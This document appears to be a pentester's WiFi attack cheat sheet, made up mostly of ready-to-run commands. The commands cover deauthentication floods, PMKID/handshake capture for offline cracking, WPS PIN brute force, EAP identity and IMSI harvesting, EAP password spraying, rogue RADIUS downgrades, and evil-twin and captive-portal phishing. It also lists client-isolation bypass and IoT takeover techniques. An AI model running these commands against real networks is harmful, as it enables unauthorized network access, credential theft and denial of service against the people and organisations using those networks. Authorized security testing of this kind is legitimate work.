# WiFi Recon & Attack Surface Survey

Recon perspective: enumerate APs/security modes, capture handshakes/PMKID, harvest EAP
identities, and assess rogue-AP feasibility. Attack tooling notes included for follow-up teams.

## Interface setup & scanning

```bash
ip link show; iwconfig
airmon-ng check kill
airmon-ng start wlan0            # monitor mode
airmon-ng stop wlan0mon
airodump-ng wlan0mon             # 2.4 GHz
airodump-ng wlan0mon --band a    # 5 GHz
airodump-ng wlan0mon --wps       # WPS scan
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA"
iwlist wlan0 scan
```

Toolkits: EAPHammer (`git clone; ./kali-setup`), Airgeddon (also dockerized:
`docker run --rm -ti --net=host --privileged -v /tmp:/io v1s1t0r1sh3r3/airgeddon`),
Wifiphisher, Wifite2 (auto WPS pixie/brute, PMKID, deauth+handshake, top5000 crack).

## Attack surface summary

- **DoS**: deauth/disassoc, beacon flood, AP overload, WIDS confusion, TKIP/EAPOL tricks.
- **Cracking**: WEP; WPA-PSK via WPS PIN, PMKID, handshake capture; WPA-MGT username capture & cred brute.
- **Evil Twin** (open / WPA-PSK / WPA-MGT) ± DoS.
- **KARMA / MANA / Loud MANA / Known-beacon** ± open/WPA.

## WPA-PSK recon

- **PMKID client-less** (many APs, no clients needed): `hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=3`
  → hcxpcapngtool → hashcat -m 22000. Bettercap: `wifi.recon on; wifi.handshakes`.
- **Handshake**: capture with airodump-ng on channel; force with deauth:
  `aireplay-ng -0 0 -a <BSSID> [-c <clientMAC>] wlan0mon`; mdk4 mode d.
- **WPS**: PIN space only 11k (validated in halves):
  - Reaver: `reaver -i wlan1mon -b <BSSID> -c 9 -b -f -N [-L -d 2] -vv`
  - Bully: `bully wlan1mon -b <BSSID> -c 9 -S -F -B -v 3`
  - Pixie Dust: `reaver ... -K 1 -N -vv` or `bully -d -v 3` or OneShot-C `./oneshot -i wlan0 -K -b <BSSID>`
  - Null PIN: reaver `-N` variant. Smart brute: vendor PIN DBs (MAC OUI→PIN), ComputePIN/EasyBox/Arcadyan algorithms.
  - MAC rotation needed when AP blocks aggressive attackers.

## WPA Enterprise (802.1X) recon

Methods seen in airodump (`WPA2 CCMP MGT`): EAP-GTC (plaintext inner — downgrade target),
EAP-MD5 (crackable), EAP-TLS (client+server certs), EAP-TTLS, PEAP-MSCHAPv2, PEAP-TLS.

- **Username capture**: outer EAP-Response/Identity is cleartext before TLS — capture eapol and
  read "Response, Identity" (`tshark -i $IFACE -Y 'eap.code == 2 && eap.type == 1' -T fields
  -e frame.time -e wlan.sa -e eap.identity`). Feeds spraying/phishing.
- **Anonymous identities**: check if `anonymous[@realm]` is actually enforced (managed Android
  profiles often leak real UPN when the outer-identity field is blank).
- **EAP-SIM/AKA IMSI leak**: bare EAP-SIM/AKA without pseudonyms exposes IMSI as 3GPP NAI
  (e.g. `20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org`) in the identity phase — passive harvest.
- **EAP brute/spray** (PEAP etc., not EAP-TLS):
  `./air-hammer.py -i wlan0 -e <SSID> -P <pass> -u users.txt`
  `./eaphammer --eap-spray --interface-pool wlan0 ... --essid <ssid> --password <pw> --user-list users.txt`
- **Evil Twin EAP-TLS weaknesses** (see evil-twin-eap-tls notes):
  1. Unauthenticated identity leak (above).
  2. Broken server cert validation → rogue RADIUS with self-signed cert works (hostapd-wpe;
     `SSL_set_verify(...,0)` style patch disables client-cert check). Windows profile red flags:
     empty "Connect to these servers", prompts allowed, extra trusted roots, wildcard names;
     triage: `netsh wlan export profile name="CorpWiFi" folder=.` then grep ServerNames/TrustedRootCAHash/DisablePrompt.
  3. TLS downgrade: TLS 1.2 static-RSA-only rogue (hostapd-wpe `disable_tlsv1_3=1`,
     `openssl_ciphers=RSA+AES:@SECLEVEL=0`) re-exposes identities/certs (RFC 9190). Windows 11 22H2
     defaults TLS1.3; FreeRADIUS 3.0.23+ supports it.
  4. Debug PEAP/EAP-TTLS tunnels: comment `dh_file` in hostapd-wpe (forces RSA key exchange),
     then add server private key in Wireshark TLS preferences to decrypt.
  - Relay instead of crack: wpa_sycophant + hostapd-mana for PEAP-MSCHAPv2 (machine accounts).
  - Downgrade to EAP-MD5 via rogue AP then `eapmd5pass -r pcap.dump -w wordlist`.

## Client-side recon theory

- PNLs (preferred network lists) drive auto-connect; passive beacons + directed/broadcast probes.
- **Probe-request recon for setup-mode IoT**: capture directed probes
  (`wlan.fc.type_subtype == 4 && wlan.ssid != ""` with tshark, keep SSID+MAC+channel+GPS),
  cluster by vendor OUI — unprovisioned devices probe a fixed setup SSID city-wide.
- **SSID-set fingerprinting** beats MAC randomization: the *set* of probed ESSIDs is the identifier.
- Open/OWE networks: frames encrypted per-station (WPA3-based, PMF blocks deauth), but no
  joiner authentication — verify client isolation; evil twin still works with stronger signal.

## Rogue AP building blocks

```bash
# dnsmasq DHCP+DNS (/etc/dnsmasq.conf: interface=wlan0, dhcp-range, dhcp-option=3/6, server=8.8.8.8)
# hostapd.conf: interface, driver=nl80211, ssid, channel, wpa=2, wpa_passphrase, WPA-PSK, CCMP
airmon-ng check kill; iwconfig wlan0 mode monitor; ifconfig wlan0 up; hostapd ./hostapd.conf
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE; iptables -A FORWARD -i wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Evil twin variants: `airbase-ng -a <BSSID> --essid "Elroy" -c 1 wlan0mon` (open);
`./eaphammer -i wlan0 --essid <corp> --captive-portal` (note: NOT monitor mode);
`./eaphammer -i wlan0 -e <corp> -c 11 --creds --auth wpa-psk --wpa-passphrase <knownPSK>`;
Airgeddon Evil Twin menu. Wifiphisher scenarios: oauth-login, wifi_connect, firmware-upgrade;
`sudo wifiphisher -aI wlan0 -eI wlan1 -p wifi_connect -hC handshake.pcap` (-hC validates submitted
keys against an existing capture via cowpatty).

KARMA/MANA/Loud MANA/Known-beacons via EAPHammer:

```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
./eaphammer -i wlan0 --cloaking full --mana --loud ...
./eaphammer -i wlan0 --mana [--loud] --known-beacons --known-ssids-file wordlist.txt
# beacon bursts: forge-beacons -i wlan1 --bssid <b> --known-essids-file list --burst-count 5
```

MFACLs: MAC/SSID white/blacklist files (wildcards ok) for selective rogue responses.

## Enterprise isolation weaknesses (AirSnitch primitives)

WPA2/3-Enterprise + client isolation is not a reliable MitM boundary:
1. Gateway bouncing (victim IP + gateway MAC defeats L2-only isolation).
2. Port stealing (spoof victim MAC cross-BSSID to poison MAC learning; can expose RADIUS UDP →
   offline attack on shared secret).
3. GTK misuse → direct broadcast injection with unicast IP payloads.
4. Broadcast reflection → cross-BSSID injection without the GTK.
Check: L2-only vs L3 isolation, inter-BSSID isolation, guest↔enterprise shared switching.

## IoT takeover patterns

- Fixed-SSID setup-mode devices: rogue AP with same SSID/security, capture EAPOL, offline PSK
  crack, then enumerate the device's management plane.
- Shelly Gen4 keeps commissioning AP alive after join (dual-homed, 192.168.33.1): unauthenticated
  relay API, scripting pivot to internal LAN. Find vendor SSIDs via wigle.net.

## Android adapter (NexMon)

Broadcom/Cypress chipsets: NexMon Magisk module + libnexmon.so/nexutil; Hijacker GUI optional.

```bash
su; getenforce; nexutil -V; getprop | grep -E 'vendor.wlan|wlan.driver|wlan.firmware'
svc wifi disable; sleep 2; ifconfig wlan0 up; nexutil -m2          # monitor (upstream flow)
# S10 guide variant: nexutil -s0x613 -i -v2
LD_PRELOAD=/path/to/libnexmon.so airodump-ng --band abg wlan0      # or libfakeioctl.so
nexutil -k6/20 ; nexutil -k36/80                                    # set chanspec
nexutil -m0; svc wifi enable                                        # back to managed
# NetHunter chroot: export LD_PRELOAD=/lib/kalilibnexmon.so; wifite -i wlan0
```

Gotchas: firmware/patch mismatch (18.38.18/18.41.8.9 patches vs newer ROMs) makes nexutil
"succeed" while iw still shows managed / zero frames — rebase patches with BinDiff/IDA for newer
firmware. SELinux often must be Permissive. Note: interface stays `wlan0` (no wlan0mon).
